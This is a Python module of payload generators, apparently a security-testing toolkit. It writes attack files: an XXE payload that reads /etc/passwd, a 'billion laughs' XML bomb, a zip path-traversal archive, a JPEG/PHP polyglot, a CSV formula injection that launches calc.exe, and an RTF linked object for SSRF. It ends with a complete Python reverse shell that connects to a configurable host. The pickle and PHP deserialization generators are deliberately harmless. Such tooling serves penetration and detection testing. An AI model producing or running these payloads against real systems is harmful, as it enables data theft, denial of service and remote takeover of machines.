import os
import zipfile
import logging
import tarfile
import io
import platform

# --- Setup ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- XML Generators ---

def generate_xxe_xml(file_to_read="/etc/passwd"):
    """Generates an XML payload for a classic XXE attack."""
    return f"""<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file://{file_to_read}">
]>
<foo>&xxe;</foo>
"""

def generate_billion_laughs_xml():
    """Generates a 'Billion Laughs' XML bomb."""
    return """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
"""

# --- Archive Generators ---

def generate_zip_traversal(output_filename, target_path, content="hacked"):
    """
    Generates a Zip file with a path traversal payload.

    Args:
        output_filename (str): The name of the zip file to create.
        target_path (str): The path for the malicious file inside the zip,
                           e.g., '../../../../../../../../etc/passwd'.
        content (str): The content to write into the malicious file.
    """
    try:
        with zipfile.ZipFile(output_filename, 'w') as zf:
            zf.writestr(target_path, content)
        logging.info(f"Successfully created zip traversal file: {output_filename}")
        return True
    except Exception as e:
        logging.error(f"Failed to create zip traversal file: {e}")
        return False

# --- Upload Generators ---

def generate_null_byte_filename_concept(output_filename, base_name, null_byte_ext, content="malicious"):
    """
    Demonstrates the concept of a null byte injection in a filename.
    A file with the specified output name is created, and the intended malicious name is logged.
    """
    intended_bad_name = f"{base_name}\\0{null_byte_ext}"

    try:
        with open(output_filename, "w") as f:
            f.write(content)
        logging.info(f"Successfully created file '{output_filename}' to demonstrate the concept of a malicious filename.")
        logging.info(f"Intended malicious name for bypassing extension checks: {repr(intended_bad_name)}")
        return True
    except Exception as e:
        logging.error(f"Failed to create file for null byte demo: {e}")
        return False

def generate_polyglot_jpeg_php(output_filename, php_code="<?php phpinfo(); ?>"):
    """
    Creates a polyglot file that is both a valid JPEG and contains PHP code.
    """
    # Minimal valid JPEG header
    jpeg_header = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'

    # Benign PHP payload, wrapped to be safe within a JPEG comment
    php_payload = f"\n*/\n{php_code}\n/*".encode('utf-8')

    # JPEG comment block: marker (FF FE) + length + payload
    comment_marker = b'\xff\xfe'
    comment_len = (len(php_payload) + 2).to_bytes(2, 'big') # +2 for the length field itself

    # Minimal valid JPEG footer
    jpeg_footer = b'\xff\xd9'

    polyglot_content = jpeg_header + comment_marker + comment_len + php_payload + jpeg_footer

    try:
        with open(output_filename, "wb") as f:
            f.write(polyglot_content)
        logging.info(f"Successfully created polyglot JPEG/PHP file: {output_filename}")
        return True
    except Exception as e:
        logging.error(f"Failed to create polyglot file: {e}")
        return False

# --- Image Generators ---

def generate_bad_png(output_filename, width=1, height=1):
    """
    Generates a PNG file with a corrupted IHDR chunk (invalid CRC).
    """
    import struct

    # A valid PNG signature
    png_sig = b'\x89PNG\r\n\x1a\n'

    # IHDR chunk: width, height, bit depth, color type, compression, filter, interlace
    ihdr_data = struct.pack('!I', width) + struct.pack('!I', height) + b'\x08\x06\x00\x00\x00'

    # Create a deliberately incorrect CRC for the IHDR chunk
    # A correct CRC would be zlib.crc32(b'IHDR' + ihdr_data)
    bad_crc = b'\xde\xad\xbe\xef'

    # IHDR chunk structure: length, chunk type, chunk data, CRC
    ihdr_chunk = struct.pack('!I', len(ihdr_data)) + b'IHDR' + ihdr_data + bad_crc

    # A minimal IEND chunk
    iend_chunk = b'\x00\x00\x00\x00IEND\xaeB`\x82'

    bad_png_content = png_sig + ihdr_chunk + iend_chunk

    try:
        with open(output_filename, "wb") as f:
            f.write(bad_png_content)
        logging.info(f"Successfully created bad PNG file with corrupted IHDR: {output_filename}")
        return True
    except Exception as e:
        logging.error(f"Failed to create bad PNG file: {e}")
        return False

# --- Deserialization Payload Generators ---

def generate_php_deserialization_concept(class_name="BenignClass", prop_name="name", prop_value="test"):
    """
    Generates a safe serialized PHP object string to demonstrate the format.
    In a real attack, the class would have a `__wakeup` or `__destruct` magic
    method designed to execute malicious code.
    """
    # O:length:"class_name":num_props:{s:prop_name_len:"prop_name";s:prop_value_len:"prop_value";}
    payload = f'O:{len(class_name)}:"{class_name}":1:{{s:{len(prop_name)}:"{prop_name}";s:{len(prop_value)}:"{prop_value}";}}'
    logging.info("Generated safe PHP deserialization string concept.")
    logging.info("In a real attack, the target class would contain a malicious magic method.")
    return payload

def generate_python_pickle_concept(output_filename, data_to_pickle={"user": "guest"}):
    """
    Generates a safe pickle file containing simple data.
    In a real attack, the pickle would be crafted with a __reduce__ method
    to execute arbitrary commands (e.g., os.system). This is NOT done here.
    """
    import pickle
    try:
        with open(output_filename, "wb") as f:
            pickle.dump(data_to_pickle, f)
        logging.info(f"Successfully created safe pickle file: {output_filename}")
        logging.info("This pickle contains only safe data. Malicious pickles are crafted to execute code on load.")
        return True
    except Exception as e:
        logging.error(f"Failed to create safe pickle file: {e}")
        return False

# --- Document Generators ---

def generate_csv_injection(output_filename, command="=cmd|'/C calc.exe'!A0"):
    """
    Generates a CSV file with a command injection payload for spreadsheet programs.
    """
    try:
        with open(output_filename, "w") as f:
            f.write(f"{command},safe,safe\\n")
            f.write("safe,safe,safe\\n")
        logging.info(f"Successfully created CSV injection file: {output_filename}")
        return True
    except Exception as e:
        logging.error(f"Failed to create CSV injection file: {e}")
        return False

def generate_rtf_linked_object(output_filename, url="http://example.com/logo.gif"):
    """
    Generates an RTF file with a linked object, which can be used for SSRF tests.
    """
    rtf_content = f"""{{\\rtf1
{{\\object\\objautlink\\objupdate
{{\\*\\objclass Picture}}
{{\\*\\objdata
01050000
02000000
07000000
5069637475726500
01000000
02000000
{len(url).to_bytes(4, 'little').hex()}
{url.encode().hex()}
00000000
}}}}}}
"""
    try:
        with open(output_filename, "w") as f:
            f.write(rtf_content)
        logging.info(f"Successfully created RTF with linked object: {output_filename}")
        return True
    except Exception as e:
        logging.error(f"Failed to create RTF file: {e}")
        return False

# --- EDR Evasion Generators ---

def generate_python_reverse_shell(output_filename, host="127.0.0.1", port=4444):
    """
    Generates a simple Python reverse shell script.
    This is a common artifact used to test EDR detection capabilities.
    """
    if platform.system() == "Windows":
        shell_process = "cmd.exe"
    else:
        shell_process = "/bin/sh"

    shell_code = f"""
import socket,subprocess,os,sys

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["{shell_process}","-i"])
"""
    try:
        with open(output_filename, "w") as f:
            f.write(shell_code.strip())
        logging.info(f"Successfully created Python reverse shell script: {output_filename}")
        return True
    except Exception as e:
        logging.error(f"Failed to create reverse shell script: {e}")
        return False